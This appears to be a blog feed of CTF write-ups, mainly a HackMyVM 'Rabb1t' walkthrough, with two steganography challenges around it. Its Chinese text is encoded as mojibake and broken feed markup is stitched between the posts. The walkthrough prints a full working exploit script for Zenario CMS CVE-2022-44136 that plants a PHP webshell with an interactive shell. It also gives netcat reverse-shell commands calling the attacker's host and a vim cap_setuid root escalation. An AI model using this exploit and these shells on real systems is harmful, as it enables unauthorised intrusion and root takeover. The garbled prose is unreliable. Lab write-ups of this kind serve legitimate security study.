isEven(R+G+B)ÊèêÁ§∫flag ËóèÂú®‚ÄúRGB ‰∏âÈÄöÈÅì‰πãÂíå‰∏∫ÂÅ∂Êï∞‚ÄùÁöÑÂÉèÁ¥†Èáå

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat decodesteg.py 
from PIL import Image

im = Image.open('challenge.png')
pixelMap = im.load()
img = Image.new( im.mode, im.size)
pixelsNew = img.load()

for i in range(img.size[0]):
    for j in range(img.size[1]):
        RGB = im.getpixel((i,j))
        R,G,B = RGB
        #

        #
        pixelsNew[i,j] = (R,G,B)
im.close()

img.show()
img.save('flag.png') 
img.close()

# Can you find the flag hidden in the image?
# may need to 'pip3 install pillow' if not installed
                                                  
```

Â°´‰ª£Á†Å

```
from PIL import Image

im = Image.open('challenge.png')
pixelMap = im.load()
img = Image.new(im.mode, im.size)
pixelsNew = img.load()

for i in range(img.size[0]):
    for j in range(img.size[1]):
        R, G, B = im.getpixel((i, j))
        if (R + G + B) % 2 == 0:
            pixelsNew[i, j] = (255, 255, 255)  
        else:
            pixelsNew[i, j] = (0, 0, 0)        

im.close()
img.show()
img.save('flag.png')
img.close()
```

![flag](https://7r1UMPHK.github.io/image/20250720152504984.webp)

```
HMV{Play_with_Pixels}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20064.html</guid><pubDate>Mon, 21 Jul 2025 04:11:52 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Rabb1t</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Rabb1t.html</link><description>![image-20250719210601338](https://7r1UMPHK.github.io/image/20250719210613707.webp)

ËøôÈù∂Êú∫ÂêçÂ≠óËµ∑ÁöÑÂ•ΩÔºåÂìàÂìàÂìà

# ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ‰∏éÊúçÂä°Êé¢Êµã

## 1. ‰∏ªÊú∫ÂèëÁé∞

È¶ñÂÖàÔºå‰ΩøÁî® `arp-scan` Âú®Êú¨Âú∞ÁΩëÁªú‰∏≠ÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫ÁöÑIPÂú∞ÂùÄ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l                     
[sudo] kali ÁöÑÂØÜÁ†ÅÔºö
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.198 08:00:27:f1:94:b8       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.
...
```

Êâ´ÊèèÁªìÊûúÁ°ÆËÆ§ÁõÆÊ†áÈù∂Êú∫ÁöÑ IP Âú∞ÂùÄ‰∏∫ **`192.168.205.198`**„ÄÇ

## 2. Á´ØÂè£Êâ´Êèè‰∏éÂä®ÊÄÅÁ´ØÂè£ÂàÜÊûê

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÁ´ØÂè£Êâ´Êèè„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.198
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1028/tcp open  unknown
...
```

Â§öÊ¨°Êâ´ÊèèÂèëÁé∞ÔºåÈô§‰∫ÜÂõ∫ÂÆöÁöÑ 22 Âíå 80 Á´ØÂè£Â§ñÔºåËøòÊúâ‰∏Ä‰∏™Á´ØÂè£Âè∑Âú® 1024 ‰ª•‰∏äÁöÑÁ´ØÂè£ÊòØÂä®ÊÄÅÂèòÂåñÁöÑÔºåÊØèÊ¨°Êâ´ÊèèÂêéÁ´ØÂè£Âè∑‰ºöÂ¢ûÂä†2Ôºå‰∏îÊúâÂ§ßÁ∫¶10ÁßíÁöÑÂºÄÊîæÈó¥Èöî„ÄÇËøôÊòØ‰∏Ä‰∏™Âä®ÊÄÅÊúçÂä°ÁöÑËøπË±°„ÄÇ

‰∏∫‰∫ÜÁ®≥ÂÆöÂú∞ËÆøÈóÆËøô‰∏™Âä®ÊÄÅÁ´ØÂè£ÔºåÁºñÂÜô‰∫Ü‰∏Ä‰∏™ bash ËÑöÊú¨ÔºåËØ•ËÑöÊú¨ËÉΩËá™Âä®ÂèëÁé∞ÂΩìÂâçÂºÄÊîæÁöÑÁ´ØÂè£ÔºåÂπ∂‰ΩøÁî® `socat` Â∞ÜÂÖ∂ÊµÅÈáèËΩ¨ÂèëÂà∞Êú¨Âú∞ÁöÑ‰∏Ä‰∏™Âõ∫ÂÆöÁ´ØÂè£„ÄÇ

### **Á´ØÂè£ËΩ¨ÂèëËÑöÊú¨ (`a.sh`)**

```
#!/bin/bash

IP=$1
LP=8000
PP=1028
PF=/tmp/socat.pid

g(){
  while :;do
    (echo &gt; /dev/tcp/$IP/$PP) 2&gt;/dev/null &amp;&amp; break || PP=$((PP+2))
    [ $PP -gt 65535 ] &amp;&amp; PP=1030
  done
}

[ -f $PF ] &amp;&amp; kill $(cat $PF) 2&gt;/dev/null &amp;&amp; rm $PF

g
socat TCP-LISTEN:$LP,fork,reuseaddr TCP:$IP:$PP &amp;
echo $! &gt; $PF

while :;do
  (echo &gt; /dev/tcp/$IP/$PP) 2&gt;/dev/null || {
    kill $(cat $PF); rm $PF
    PP=$((PP+2))
    [ $PP -gt 65535 ] &amp;&amp; PP=1030
    g
    socat TCP-LISTEN:$LP,fork,reuseaddr TCP:$IP:$PP &amp;
    echo $! &gt; $PF
  }
  sleep 1
done
```

ËøêË°åÊ≠§ËÑöÊú¨ÂêéÔºåÂä®ÊÄÅÁ´ØÂè£ÁöÑÊúçÂä°Ë¢´ÊàêÂäüËΩ¨ÂèëÂà∞Êú¨Âú∞ÁöÑ `8000` Á´ØÂè£„ÄÇ

# ‰∫å„ÄÅWebÂ∫îÁî®Ê∏óÈÄè‰∏éÊºèÊ¥ûÂà©Áî®

## 1. ÁõÆÂΩïÊâ´Êèè‰∏é‰ø°ÊÅØÊ≥ÑÈú≤

ÈÄöËøáÊú¨Âú∞ `8000` Á´ØÂè£ÂØπËΩ¨ÂèëÁöÑÊúçÂä°ËøõË°åÁõÆÂΩïÊâ´Êèè„ÄÇ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ffuf -u 'http://192.168.205.128:8000/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --fl 15 -e .php,.txt,.html,.zip
...
password.txt            [Status: 200, Size: 74, Words: 11, Lines: 4, Duration: 9ms]
robots.txt              [Status: 200, Size: 251, Words: 12, Lines: 12, Duration: 214ms]
...
```

Êâ´ÊèèÂèëÁé∞‰∫Ü `robots.txt` Êñá‰ª∂ÔºåÂÖ∂ÂÜÖÂÆπÊ≥ÑÈú≤‰∫ÜÂ§ö‰∏™ÂêéÂè∞ÁõÆÂΩïÔºåÂÖ∂‰∏≠ÊúÄÂÖ≥ÈîÆÁöÑÊòØ `zenario`„ÄÇ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ curl http://192.168.205.128:8000/robots.txt
User-agent: *
Disallow: /admin/
...
Disallow: /zenario/
...
```

ËÆøÈóÆËØ• Web ÊúçÂä°ÔºåÊü•ÁúãÊ∫ê‰ª£Á†ÅÔºåÂèëÁé∞ÂÖ∂‰ΩøÁî®‰∫Ü **Zenario CMS**ÔºåÁâàÊú¨Âè∑‰∏∫ `9.3.57186`„ÄÇ

## 2. Zenario CMS ÊºèÊ¥ûÂà©Áî®

ÈÄöËøáÊêúÁ¥¢ÂÖ¨ÂºÄÊºèÊ¥ûÂ∫ìÔºåÂèëÁé∞ Zenario CMS 9.3 ÁâàÊú¨Â≠òÂú®‰∏Ä‰∏™Êú™ÁªèË∫´‰ªΩÈ™åËØÅÁöÑËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û **(CVE-2022-44136)**„ÄÇÊ†πÊçÆÂÖ¨ÂºÄÁöÑ PoCÔºåÊàë‰ª¨ÁºñÂÜô‰∫Ü‰∏Ä‰∏™Âà©Áî®ËÑöÊú¨ (`exp.py`) Êù•‰∏ä‰º†‰∏Ä‰∏™ webshell„ÄÇ

&gt; [!Tip]
&gt;
&gt; https://com0t.github.io/zenar.io/2022/10/18/Unauthent-RCE-Zenar.io~9.3.html

### Âà©Áî®ËÑöÊú¨exp.py

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Exploit Title: Zenario CMS 9.3 - Unauthenticated Remote Code Execution (RCE)
# CVE: CVE-2022-44136
# Author: Gemini (based on provided request analysis)
# Date: 2025-07-19
# Description: This script exploits an unrestricted file upload vulnerability in
# Zenario CMS 9.3. The vulnerability is triggered by a typo in the Content-Type
# header (`Content-Tyope`) which bypasses the file type validation, allowing
# the upload of a PHP webshell.

import requests
import argparse
import sys
import json
from urllib.parse import urljoin

# ÂÖ≥Èó≠requestsÂ∫ìÂõ†ËØÅ‰π¶È™åËØÅÂ§±Ë¥•ËÄå‰∫ßÁîüÁöÑË≠¶Âëä
requests.packages.urllib3.disable_warnings()

def print_banner():
    '''ÊâìÂç∞‰∏Ä‰∏™ÊºÇ‰∫ÆÁöÑÊ®™ÂπÖ'''
    print('=' * 60)
    print(' Zenario CMS 9.3 Unauthenticated RCE Exploit (CVE-2022-44136)')
    print('=' * 60)

def exploit(target_url, instance_id, filename):
    '''ÊâßË°åÊºèÊ¥ûÂà©Áî®ÁöÑÊ†∏ÂøÉÂáΩÊï∞'''
    
    endpoint = '/zenario/ajax.php'
    upload_url = urljoin(target_url, endpoint)

    # WebshellÁöÑÂÜÖÂÆπ
    webshell_content = b'&lt;?php echo '&gt;&gt;&gt;'; system($_GET['cmd']); echo '&lt;&lt;&lt;'; ?&gt;'

    # URLÊü•ËØ¢ÂèÇÊï∞Ôºå‰∏éÊà™Âõæ‰∏≠‰øùÊåÅ‰∏ÄËá¥
    params = {
        'method_call': 'handlePluginAJAX',
        'cID': '1',
        'slideId': '0',
        'cType': 'html',
        'instanceId': instance_id,
        'fileUpload': ''
    }

    # ËøôÊòØË¶Å‰∏ä‰º†ÁöÑÊñá‰ª∂„ÄÇÊàë‰ª¨ÂÖàÊ≠£Â∏∏ÂÆö‰πâÂÆÉ„ÄÇ
    # ('fileUpload', (filename, webshell_content, 'image/jpeg'))
    #  ^--Ë°®ÂçïÂ≠óÊÆµÂêç      ^--Êñá‰ª∂Âêç   ^--Êñá‰ª∂ÂÜÖÂÆπ      ^--‰∏Ä‰∏™Êó†ÂÆ≥ÁöÑContent-Type
    files = {
        'fileUpload': (filename, webshell_content, 'image/jpeg')
    }

    print(f'[*] ÂáÜÂ§áÂêë {upload_url} ‰∏ä‰º†webshell...')
    print(f'[*] ‰ΩøÁî® Instance ID: {instance_id}')
    print(f'[*] ‰∏ä‰º†Êñá‰ª∂Âêç: {filename}')

    # --- ÂÖ≥ÈîÆÁöÑÁªïËøáÊ≠•È™§ ---
    # 1. ‰ΩøÁî®requestsÂ∫ìÂáÜÂ§á‰∏Ä‰∏™ËØ∑Ê±ÇÂØπË±°Ôºå‰ΩÜÂÖà‰∏çÂèëÈÄÅ
    session = requests.Session()
    req = requests.Request('POST', upload_url, params=params, files=files)
    prepared_req = req.prepare()

    # 2. prepared_req.bodyÊòØbytesÁ±ªÂûãÔºåÂåÖÂê´‰∫ÜÊï¥‰∏™multipart/form-dataÁöÑÂÜÖÂÆπ
    #    Êàë‰ª¨Â∞ÜÂÖ∂Ëß£Á†Å‰∏∫Â≠óÁ¨¶‰∏≤ÔºåËøõË°åÊõøÊç¢Êìç‰ΩúÔºåÁÑ∂ÂêéÂÜçÁºñÁ†ÅÂõûÂéª
    body_str = prepared_req.body.decode('utf-8', errors='ignore')

    # 3. Â∞Ü 'Content-Type' ÊõøÊç¢‰∏∫ 'Content-Tyope'ÔºåËøôÊòØÊºèÊ¥ûÁöÑÊ†∏ÂøÉ
    modified_body_str = body_str.replace('Content-Type: image/jpeg', 'Content-Tyope: image/svg+xml')
    prepared_req.body = modified_body_str.encode('utf-8')
    
    # 4. Êõ¥Êñ∞Content-LengthÂ§¥ÔºåÂõ†‰∏∫Êàë‰ª¨ÁöÑ‰øÆÊîπÂèØËÉΩÂØºËá¥ÈïøÂ∫¶ÂèòÂåñÔºàÂ∞ΩÁÆ°ËøôÈáåÊ≤°ÊúâÔºâ
    prepared_req.headers['Content-Length'] = str(len(prepared_req.body))

    print('[+] ËØ∑Ê±ÇÂ∑≤Ë¢´‰øÆÊîπÔºåÊ≥®ÂÖ• 'Content-Tyope' ÁªïËøá‰ª£Á†Å„ÄÇ')
    print('[*] Ê≠£Âú®ÂèëÈÄÅÊÅ∂ÊÑèËØ∑Ê±Ç...')

    try:
        # 5. ÂèëÈÄÅÊàë‰ª¨ÊâãÂä®‰øÆÊîπËøáÁöÑËØ∑Ê±Ç
        response = session.send(prepared_req, verify=False, timeout=15)

        # Ê£ÄÊü•ÂìçÂ∫îÊòØÂê¶ÊàêÂäü
        if response.status_code == 200:
            print('[+] ÊúçÂä°Âô®ËøîÂõû 200 OKÔºåÂèØËÉΩ‰∏ä‰º†ÊàêÂäüÔºÅ')
            try:
                # Ëß£ÊûêÊúçÂä°Âô®ËøîÂõûÁöÑJSON
                response_json = response.json()
                file_path = response_json['files'][0]['path']
                
                # ÊûÑÂª∫ÂÆåÊï¥ÁöÑwebshell URL
                webshell_url = urljoin(target_url, f'{file_path}')
                print('\n' + '='*60)
                print(f'[\033[1;32mSUCCESS\033[0m] Webshell‰∏ä‰º†ÊàêÂäü!')
                print(f'[\033[1;32mURL\033[0m]: {webshell_url}')
                print('='*60 + '\n')
                return webshell_url
            except (json.JSONDecodeError, KeyError, IndexError):
                print('[-] ‰∏ä‰º†ÊàêÂäüÔºå‰ΩÜÊó†Ê≥ï‰ªéÂìçÂ∫î‰∏≠Ëß£ÊûêÊñá‰ª∂Ë∑ØÂæÑ„ÄÇ')
                print('[-] ÂìçÂ∫îÂÜÖÂÆπ: ', response.text)
                return None
        else:
            print(f'[-] ‰∏ä‰º†Â§±Ë¥•ÔºåÊúçÂä°Âô®ËøîÂõûÁä∂ÊÄÅÁ†Å: {response.status_code}')
            return None

    except requests.exceptions.RequestException as e:
        print(f'[-] ËØ∑Ê±ÇÂèëÁîüÈîôËØØ: {e}')
        return None

def interactive_shell(webshell_url):
    '''Êèê‰æõ‰∏Ä‰∏™‰∫§‰∫íÂºèÁöÑÂëΩ‰ª§ÊâßË°åÁéØÂ¢É'''
    print('[*] ÂêØÂä®‰∫§‰∫íÂºèWebshell... (ËæìÂÖ• 'exit' ÈÄÄÂá∫)')
    session = requests.Session()
    try:
        while True:
            cmd = input('\033[1;34mcmd &gt; \033[0m')
            if cmd.lower() in ['exit', 'quit']:
                break
            
            # ÂèëÈÄÅGETËØ∑Ê±ÇÊù•ÊâßË°åÂëΩ‰ª§
            params = {'cmd': cmd}
            try:
                response = session.get(webshell_url, params=params, verify=False, timeout=10)
                # ÊèêÂèñÁî± '&gt;&gt;&gt;' Âíå '&lt;&lt;&lt;' ÂåÖË£πÁöÑÂëΩ‰ª§ËæìÂá∫
                output = response.text.split('&gt;&gt;&gt;')[1].split('&lt;&lt;&lt;')[0]
                print(output)
            except requests.exceptions.RequestException as e:
                print(f'[-] ÂëΩ‰ª§ÊâßË°åÂ§±Ë¥•: {e}')
            except IndexError:
                 print(f'[-] Êó†Ê≥ï‰ªéÂìçÂ∫î‰∏≠ÊèêÂèñÂëΩ‰ª§ËæìÂá∫„ÄÇ')
                 print(f'[-] ÂéüÂßãÂìçÂ∫î: {response.text}')


    except KeyboardInterrupt:
        print('\n[*] Ê£ÄÊµãÂà∞Ctrl+CÔºåÊ≠£Âú®ÈÄÄÂá∫„ÄÇ')
    print('[*] Webshell‰ºöËØùÂ∑≤ÂÖ≥Èó≠„ÄÇ')


if __name__ == '__main__':
    print_banner()
    parser = argparse.ArgumentParser(description='Zenario CMS 9.3 RCE (CVE-2022-44136) Exploit')
    parser.add_argument('target_url', help='ÁõÆÊ†áURL (‰æãÂ¶Ç: http://192.168.205.128:8000)')
    parser.add_argument('--instance-id', default='20', help='Êñá‰ª∂‰∏ä‰º†Ë°®ÂçïÁöÑinstanceId (ÈªòËÆ§‰∏∫20)')
    parser.add_argument('--filename', default='shell.php', help='‰∏ä‰º†ÁöÑwebshellÊñá‰ª∂Âêç (ÈªòËÆ§‰∏∫shell.php)')
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
        
    args = parser.parse_args()
    
    shell_url = exploit(args.target_url, args.instance_id, args.filename)
    
    if shell_url:
        interactive_shell(shell_url)
    else:
        print('\n[-] ÊºèÊ¥ûÂà©Áî®Â§±Ë¥•ÔºåÊú™ËÉΩËé∑ÂèñWebshell„ÄÇ')
                                           
```

ÊâßË°åÂà©Áî®ËÑöÊú¨Ôºö

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ python3 exp.py http://192.168.205.128:8000                            
============================================================
 Zenario CMS 9.3 Unauthenticated RCE Exploit (CVE-2022-44136)
============================================================
[*] ÂáÜÂ§áÂêë http://192.168.205.128:8000/zenario/ajax.php ‰∏ä‰º†webshell...
[*] ‰ΩøÁî® Instance ID: 20
[*] ‰∏ä‰º†Êñá‰ª∂Âêç: shell.php
[+] ËØ∑Ê±ÇÂ∑≤Ë¢´‰øÆÊîπÔºåÊ≥®ÂÖ• 'Content-Tyope' ÁªïËøá‰ª£Á†Å„ÄÇ
[*] Ê≠£Âú®ÂèëÈÄÅÊÅ∂ÊÑèËØ∑Ê±Ç...
[+] ÊúçÂä°Âô®ËøîÂõû 200 OKÔºåÂèØËÉΩ‰∏ä‰º†ÊàêÂäüÔºÅ

============================================================
[SUCCESS] Webshell‰∏ä‰º†ÊàêÂäü!
[URL]: http://192.168.205.128:8000/private/uploads/JEk-Wwl_SpBQMaPvCw3mgBcAB1m7bw/shell.php
============================================================

[*] ÂêØÂä®‰∫§‰∫íÂºèWebshell... (ËæìÂÖ• 'exit' ÈÄÄÂá∫)
cmd &gt; id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

ËÑöÊú¨ÊàêÂäü‰∏ä‰º†‰∫Ü‰∏Ä‰∏™PHP webshellÔºåÂπ∂Ëé∑Âæó‰∫Ü `www-data` Áî®Êà∑ÁöÑÂëΩ‰ª§ÊâßË°åÊùÉÈôê„ÄÇ

# ‰∏â„ÄÅÂàùÂßãËÆøÈóÆ‰∏éÊú¨Âú∞Êûö‰∏æ

## 1. ÂèçÂºπ Shell

‰∏∫‰∫ÜËé∑ÂæóÊõ¥Á®≥ÂÆöÁöÑ‰∫§‰∫íÂºè‰ºöËØùÔºåÂú®ÊîªÂáªÊú∫‰∏äËÆæÁΩÆ Netcat ÁõëÂê¨ÔºåÂπ∂‰ªé webshell ‰∏≠ÊâßË°åÂèçÂºπ shell ÂëΩ‰ª§„ÄÇ

**ÊîªÂáªÊú∫ÁõëÂê¨:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nc -lvnp 8888
```

**Webshell ‰∏≠ÊâßË°å:**

```bash
cmd &gt; busybox nc 192.168.205.128 8888 -e /bin/bash
```

ÊàêÂäüËé∑Âæó `www-data` Áî®Êà∑ÁöÑÂèçÂºπ shellÔºåÂπ∂ÂçáÁ∫ß‰∏∫Ê†áÂáÜÁöÑ TTY„ÄÇ

```
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```

## 2. Êú¨Âú∞‰ø°ÊÅØÊî∂ÈõÜ

Âú® `/home` ÁõÆÂΩï‰∏ãÂèëÁé∞Áî®Êà∑ `morii`ÔºåÂπ∂Âú®ÂÖ∂ÂÆ∂ÁõÆÂΩï‰∏ãÊâæÂà∞Âπ∂ËØªÂèñ‰∫Ü `user.txt` Êñá‰ª∂„ÄÇ

```
www-data@Rabb1t:/home/morii$ ls -al
...
-rw-r--r-- 1 morii morii   32 Jul 17 11:09 user.txt
www-data@Rabb1t:/home/morii$ cat user.txt 
flag{user_Down the Rabbit-Hole}
```

# Âõõ„ÄÅÊùÉÈôêÊèêÂçá

## 1. SUID/Capabilities ÊùÉÈôêÊ£ÄÊü•

ÂØπÁ≥ªÁªüËøõË°åÊùÉÈôêÊèêÂçáÂêëÈáèÁöÑÊéíÊü•„ÄÇ`find` ÂëΩ‰ª§Êü•Êâæ SUID Êñá‰ª∂Ôºå‰ΩÜÊú™ÂèëÁé∞ÊòéÊòæÂèØÂà©Áî®ÁöÑÂºÇÂ∏∏Êñá‰ª∂„ÄÇÊé•ÁùÄ‰ΩøÁî® `getcap` Ê£ÄÊü•Êñá‰ª∂ÁöÑ Capabilities„ÄÇ

```
www-data@Rabb1t:/home/morii$ getcap -r / 2&gt;/dev/null
/usr/bin/vim = cap_setuid+ep
...
```

ÂèëÁé∞ `/usr/bin/vim` Ë¢´Êéà‰∫à‰∫Ü `cap_setuid+ep` ÊùÉÈôê„ÄÇËøôÊÑèÂë≥ÁùÄ Vim ËøõÁ®ãÂèØ‰ª•Ë∞ÉÁî® `setuid()` Á≥ªÁªüË∞ÉÁî®Êù•ÊîπÂèòÂÖ∂ÊúâÊïàÁî®Êà∑ID (EUID)„ÄÇ

## 2. Âà©Áî® Vim Capabilities ÊèêÊùÉ

Ê£ÄÊü• Vim ÁöÑÁºñËØëÈÄâÈ°πÔºåÁ°ÆËÆ§ÂÖ∂ÊòØÂê¶ÊîØÊåÅÂèØÁî®‰∫éÊâßË°å‰ª£Á†ÅÁöÑËÑöÊú¨Êé•Âè£„ÄÇ

```
www-data@Rabb1t:/home/morii$ vim --version
...
-python            -python3           +ruby              
...
```

ÁªìÊûúÊòæÁ§∫ÔºåËôΩÁÑ∂ Python Êé•Âè£Ë¢´Á¶ÅÁî®‰∫ÜÔºå‰ΩÜ **Ruby (`+ruby`)** Êé•Âè£ÊòØÂêØÁî®ÁöÑ„ÄÇÊàë‰ª¨ÂèØ‰ª•Âà©Áî® Vim ÁöÑ Ruby Êé•Âè£ÔºåÁªìÂêà `cap_setuid` ÊùÉÈôêÊù•ÊâßË°å‰ª£Á†ÅÂπ∂ÊèêÊùÉËá≥ root„ÄÇ

**ÊèêÊùÉÊ≠•È™§Ôºö**

1. Âú®ÊîªÂáªÊú∫‰∏äÂºÄÂêØ Netcat ÁõëÂê¨‰ª•Êé•Êî∂ root shell„ÄÇ

   ```bash
   nc -lvnp 8888
   ```

2. Âú®Èù∂Êú∫‰∏äÊâßË°å‰∏ÄÊù°Á≤æÂøÉÊûÑÈÄ†ÁöÑ Vim ÂëΩ‰ª§„ÄÇËØ•ÂëΩ‰ª§Âà©Áî® Ruby Êé•Âè£È¶ñÂÖàÂ∞ÜËøõÁ®ãÁöÑ EUID ËÆæÁΩÆ‰∏∫ 0 (root)ÔºåÁÑ∂ÂêéÊâßË°å‰∏Ä‰∏™ÂèçÂºπ shell ÂëΩ‰ª§„ÄÇ

   ```bash
   vim -c ':ruby Process::Sys.setuid(0); exec('busybox nc 192.168.205.128 8888 -e /bin/bash')'
   ```

ÊîªÂáªÊú∫ÊàêÂäüÊé•Êî∂Âà∞ËøûÊé•ÔºåËé∑Âæó‰∫Ü‰∏Ä‰∏™ `euid=0` ÁöÑ root ÊùÉÈôê shell„ÄÇ

# 3. Ëé∑ÂèñÊúÄÁªàÂá≠ËØÅ

Âú® root shell ‰∏≠ÔºåËØªÂèñ `/root` ÁõÆÂΩï‰∏ãÁöÑÊúÄÁªà flag Êñá‰ª∂„ÄÇ

```bash
root@Rabb1t:/home/morii# id
uid=0(root) gid=33(www-data) groups=33(www-data)
root@Rabb1t:/home/morii# cat /root/root.txt /home/morii/user.txt 
flag{root_Alice‚Äôs Evidence}
flag{user_Down the Rabbit-Hole}
```

Ëá≥Ê≠§ÔºåÊ∏óÈÄèÊµãËØïÂÆåÊàêÔºåÊàêÂäüËé∑Âèñ‰∫ÜÁ≥ªÁªüÁöÑ root ÊùÉÈôê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Rabb1t.html</guid><pubDate>Sun, 20 Jul 2025 06:33:40 +0000</pubDate></item><item><title>Challenge 063</title><link>https://7r1UMPHK.github.io/post/Challenge%20063.html</link><description>![image-20250718221751985](https://7r1umphk.github.io/image/20250718221752208.webp)

https://hackmyvm.eu/challenges/challenge.php?c=063

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -la        
ÊÄªËÆ° 4655
drwxr-xr-x 1 kali kali    4096  7Êúà18Êó• 10:10 .
drwxr-xr-x 1 kali kali    8192  7Êúà17Êó• 23:37 ..
-rwxr-xr-x 1 kali kali 2377257 2023Âπ¥ 1Êúà10Êó• 062.png
-rwxr-xr-x 1 kali kali 2375882  7Êúà18Êó• 10:10 062.zip
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -al 063.zip 
-rwxr-xr-x 1 kali kali 431  7Êúà18Êó• 10:18 063.zip
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x 063.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 431 bytes (1 KiB)

Extracting archive: 063.zip
--
Path = 063.zip
Type = zip
Physical Size = 431

Everything is Ok

Size:       671
Compressed: 431
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -al        
ÊÄªËÆ° 14
drwxr-xr-x 1 kali kali 4096  7Êúà18Êó• 10:18 .
drwxr-xr-x 1 kali kali 8192  7Êúà17Êó• 23:37 ..
-rwxr-xr-x 1 kali kali  671 2024Âπ¥ 1Êúà24Êó• 063.txt
-rwxr-xr-x 1 kali kali  431  7Êúà18Êó• 10:18 063.zip
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat 063.txt
In the script's silent dance, spaces weave,                              
A hidden language, easy to deceive.                                          
Between the lines, where eyes might stray,                            
The secret dwells in whitespace's play.                                
                                                                           
Embrace the gaps, where silence gleams,                                    
Decode the whispers in code's dreams.                                    
In every blank, a story told,                                              
For beginners bold, a mystery unfolds.                                      
                                                                            
                                                                           
                                                                            
           
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat -A 063.txt 
In the script's silent dance, spaces weave,^I   ^I  ^I       ^I $
A hidden language, easy to deceive.       ^I     ^I   ^I  ^I     $
Between the lines, where eyes might stray, ^I      ^I ^I      $
The secret dwells in whitespace's play.^I       ^I     ^I     ^I       $
^I    ^I   ^I^I      ^I  ^I  ^I       ^I ^I   $
Embrace the gaps, where silence gleams, ^I   ^I ^I      ^I   $
Decode the whispers in code's dreams. ^I  ^I      ^I  ^I       ^I $
In every blank, a story told, ^I  ^I     ^I   ^I ^I       ^I   $
For beginners bold, a mystery unfolds.   ^I     ^I  ^I  ^I    $
       ^I       ^I    ^I    ^I     ^I     ^I  ^I   ^I     ^I    $
  ^I      ^I^I      ^I ^I^I   ^I ^I   ^I   $
^I       ^I  ^I  ^I    ^I    ^I     ^I    ^I     ^I    $
  ^I   $
                            
```

ÂØπÁ©∫ÁôΩÊØîËæÉÊïèÊÑü

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ stegsnow 063.txt 
ÔøΩÔøΩrÔøΩÔøΩ=ÔøΩ^iÔøΩÔøΩ5ÔøΩWOÔøΩHÔøΩMÔøΩRÔøΩpiÔøΩÔøΩM+                                                                                                                                                                               
```

ÁúãÊ†∑Â≠êÊúâÂä†ÂØÜÔºåÂéªÊâíÊãâ‰∏Ä‰∏™ÁàÜÁ†¥
https://github.com/cyberpoul/StegsnowBruteForcer

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$git clone https://github.com/cyberpoul/StegsnowBruteForcer.git
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cd StegsnowBruteForcer
                                                                                       
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/StegsnowBruteForcer]
‚îî‚îÄ$ source ~/pythonvenv/bin/activate
                             
‚îå‚îÄ‚îÄ(pythonvenv)‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/StegsnowBruteForcer]
‚îî‚îÄ$ pip install -r requirements.txt

‚îå‚îÄ‚îÄ(pythonvenv)‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/StegsnowBruteForcer]
